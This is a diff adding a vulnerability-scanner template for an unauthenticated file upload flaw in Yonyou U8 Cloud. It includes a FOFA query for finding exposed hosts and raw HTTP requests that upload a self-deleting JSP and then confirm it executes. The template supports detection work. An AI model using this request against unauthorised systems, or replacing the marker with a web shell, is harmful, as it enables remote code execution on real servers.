@@ -1,0 +1,42 @@
+id: yonyou-u8-cloud-linux-page-fileupload
+
+info:
+  name: 用友 U8 Cloud linux/pages/upload.jsp - fileupload
+  author: leadlife
+  severity: critical
+  description: 用友U8 cloud的upload接口对用户传入的参数未进行有效的过滤，攻击者可利用该漏洞上传任意文件。
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: app="用友-U8-Cloud" || title=="U8C"
+  tags: yonyou,oa,u8cloud,fileupload
+  
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  file_content: "{{to_lower(rand_text_alpha(8))}}"
+
+http:
+  - raw:
+      - |-
+        POST /linux/pages/upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        filename: {{file_name}}
+        Accept-Encoding: gzip
+        Content-Length: 25
+
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      
+      - |+
+        GET /linux/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36        
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body_1, "success") && contains(body_2, "{{randstr}}")'
